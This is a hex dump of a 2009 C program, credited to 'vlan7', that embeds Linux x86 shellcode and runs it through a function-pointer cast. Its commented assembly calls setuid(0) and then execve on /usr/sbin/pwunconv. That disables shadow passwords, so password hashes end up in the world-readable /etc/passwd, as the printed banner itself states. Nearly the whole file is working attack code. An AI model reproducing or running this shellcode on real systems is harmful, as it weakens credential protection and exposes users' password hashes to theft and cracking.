00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 63 5b 5d 3d 20 22  5c 78 33 31 5c 78 64 62  | sc[]= "\x31\xdb|
00000030  22 20 2f 2f 78 6f 72 20  65 62 78 2c 65 62 78 0d  |" //xor ebx,ebx.|
00000040  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000050  20 20 22 5c 78 38 64 5c  78 34 33 5c 78 31 37 22  |  "\x8d\x43\x17"|
00000060  20 2f 2f 4c 45 41 20 65  61 78 2c 5b 65 62 78 20  | //LEA eax,[ebx |
00000070  2b 20 30 78 31 37 5d 20  2f 4c 45 41 20 69 73 20  |+ 0x17] /LEA is |
00000080  46 41 53 54 45 52 20 74  68 61 6e 20 70 75 73 68  |FASTER than push|
00000090  20 61 6e 64 20 70 6f 70  21 0d 0a 20 20 20 20 20  | and pop!..     |
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 39  |            "\x9|
000000b0  39 22 20 2f 2f 63 64 71  0d 0a 20 20 20 20 20 20  |9" //cdq..      |
000000c0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 63 64  |           "\xcd|
000000d0  5c 78 38 30 22 20 2f 2f  69 6e 74 20 38 30 20 2f  |\x80" //int 80 /|
000000e0  2f 73 65 74 75 69 64 28  30 29 20 73 68 6f 75 6c  |/setuid(0) shoul|
000000f0  64 6e 27 74 20 72 65 74  75 72 6e 73 20 2d 31 20  |dn't returns -1 |
00000100  72 69 67 68 74 3f 20 3b  29 0d 0a 20 20 20 20 20  |right? ;)..     |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 62  |            "\xb|
00000120  30 5c 78 30 62 22 20 2f  2f 6d 6f 76 20 61 6c 2c  |0\x0b" //mov al,|
00000130  30 62 68 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |0bh..           |
00000140  20 20 20 20 20 20 22 5c  78 35 32 22 20 2f 2f 70  |      "\x52" //p|
00000150  75 73 68 20 65 64 78 20  2f 54 65 72 6d 69 6e 61  |ush edx /Termina|
00000160  20 6c 61 20 63 61 64 65  6e 61 20 63 6f 6e 20 75  | la cadena con u|
00000170  6e 20 30 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |n 0..           |
00000180  20 20 20 20 20 20 22 5c  78 36 38 5c 78 36 33 5c  |      "\x68\x63\|
00000190  78 36 66 5c 78 36 65 5c  78 37 36 22 20 2f 2f 70  |x6f\x6e\x76" //p|
000001a0  75 73 68 20 64 77 6f 72  64 20 22 63 6f 6e 76 22  |ush dword "conv"|
000001b0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000001c0  20 20 20 22 5c 78 36 38  5c 78 37 30 5c 78 37 37  |   "\x68\x70\x77|
000001d0  5c 78 37 35 5c 78 36 65  22 20 2f 2f 70 75 73 68  |\x75\x6e" //push|
000001e0  20 64 77 6f 72 64 20 22  70 77 75 6e 22 0d 0a 20  | dword "pwun".. |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  22 5c 78 36 38 5c 78 36  32 5c 78 36 39 5c 78 36  |"\x68\x62\x69\x6|
00000210  65 5c 78 32 66 22 20 2f  2f 70 75 73 68 20 64 77  |e\x2f" //push dw|
00000220  6f 72 64 20 22 62 69 6e  2f 22 0d 0a 20 20 20 20  |ord "bin/"..    |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000240  36 38 5c 78 37 33 5c 78  37 32 5c 78 32 66 5c 78  |68\x73\x72\x2f\x|
00000250  37 33 22 20 2f 2f 70 75  73 68 20 64 77 6f 72 64  |73" //push dword|
00000260  20 22 73 72 2f 73 22 0d  0a 20 20 20 20 20 20 20  | "sr/s"..       |
00000270  20 20 20 20 20 20 20 20  20 20 22 5c 78 36 38 5c  |          "\x68\|
00000280  78 32 66 5c 78 32 66 5c  78 32 66 5c 78 37 35 22  |x2f\x2f\x2f\x75"|
00000290  20 2f 2f 70 75 73 68 20  64 77 6f 72 64 20 22 2f  | //push dword "/|
000002a0  2f 2f 75 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |//u"..          |
000002b0  20 20 20 20 20 20 20 22  5c 78 38 39 5c 78 65 33  |       "\x89\xe3|
000002c0  22 20 2f 2f 6d 6f 76 20  65 62 78 2c 65 73 70 0d  |" //mov ebx,esp.|
000002d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000002e0  20 20 22 5c 78 38 39 5c  78 64 31 22 20 2f 2f 6d  |  "\x89\xd1" //m|
000002f0  6f 76 20 65 63 78 2c 65  64 78 0d 0a 20 20 20 20  |ov ecx,edx..    |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000310  63 64 5c 78 38 30 22 3b  20 2f 2f 69 6e 74 20 38  |cd\x80"; //int 8|
00000320  30 68 0d 0a 0d 0a 76 6f  69 64 20 6d 61 69 6e 28  |0h....void main(|
00000330  29 0d 0a 7b 0d 0a 20 20  70 72 69 6e 74 66 28 22  |)..{..  printf("|
00000340  5c 6e 7e 20 54 68 69 73  20 73 68 65 6c 6c 63 6f  |\n~ This shellco|
00000350  64 65 20 64 69 73 61 62  6c 65 73 20 73 68 61 64  |de disables shad|
00000360  6f 77 69 6e 67 20 6f 6e  20 61 20 6c 69 6e 75 78  |owing on a linux|
00000370  20 73 79 73 74 65 6d 20  7e 22 0d 0a 20 20 20 20  | system ~"..    |
00000380  20 20 20 20 20 22 5c 6e  5c 6e 5c 74 20 7e 20 43  |     "\n\n\t ~ C|
00000390  6f 64 65 64 20 62 79 20  76 6c 61 6e 37 20 7e 22  |oded by vlan7 ~"|
000003a0  0d 0a 20 20 20 20 20 20  20 20 20 22 5c 6e 5c 74  |..         "\n\t|
000003b0  20 7e 20 68 74 74 70 3a  2f 2f 76 6c 61 6e 37 2e  | ~ http://vlan7.|
000003c0  62 6c 6f 67 73 70 6f 74  2e 63 6f 6d 20 7e 22 0d  |blogspot.com ~".|
000003d0  0a 20 20 20 20 20 20 20  20 20 22 5c 6e 5c 6e 20  |.         "\n\n |
000003e0  7e 20 44 61 74 65 3a 20  34 2f 4a 75 6c 2f 32 30  |~ Date: 4/Jul/20|
000003f0  30 39 22 0d 0a 0d 0a 20  20 20 20 20 20 20 20 20  |09"....         |
00000400  22 5c 6e 5c 74 59 6f 75  27 6c 6c 20 68 61 76 65  |"\n\tYou'll have|
00000410  20 74 68 65 20 70 61 73  73 77 6f 72 64 73 20 73  | the passwords s|
00000420  74 6f 72 65 64 20 69 6e  20 2f 65 74 63 2f 70 61  |tored in /etc/pa|
00000430  73 73 77 64 2e 22 0d 0a  09 09 20 22 5c 6e 5c 74  |sswd.".... "\n\t|
00000440  46 6f 72 20 75 6e 64 6f  20 70 75 72 70 6f 73 65  |For undo purpose|
00000450  73 20 75 73 65 20 74 68  65 20 70 77 63 6f 6e 76  |s use the pwconv|
00000460  20 63 6f 6d 6d 61 6e 64  2e 22 0d 0a 20 20 20 20  | command."..    |
00000470  20 20 20 20 20 22 5c 6e  5c 74 20 7e 20 43 68 65  |     "\n\t ~ Che|
00000480  65 72 73 20 67 6f 20 74  6f 3a 20 57 61 64 61 6c  |ers go to: Wadal|
00000490  62 65 72 74 69 61 22 0d  0a 20 20 20 20 20 20 20  |bertia"..       |
000004a0  20 20 22 5c 6e 5c 74 20  7e 20 53 68 65 6c 6c 63  |  "\n\t ~ Shellc|
000004b0  6f 64 65 20 53 69 7a 65  3a 20 25 64 20 62 79 74  |ode Size: %d byt|
000004c0  65 73 5c 6e 5c 6e 22 2c  0d 0a 20 20 20 20 20 20  |es\n\n",..      |
000004d0  20 20 20 20 20 20 20 20  20 20 73 69 7a 65 6f 66  |          sizeof|
000004e0  28 73 63 29 2d 31 29 3b  0d 0a 0d 0a 20 20 20 20  |(sc)-1);....    |
000004f0  20 20 20 20 28 2a 28 76  6f 69 64 20 28 2a 29 28  |    (*(void (*)(|
00000500  29 29 20 73 63 29 28 29  3b 0d 0a 7d              |)) sc)();..}|
0000050c
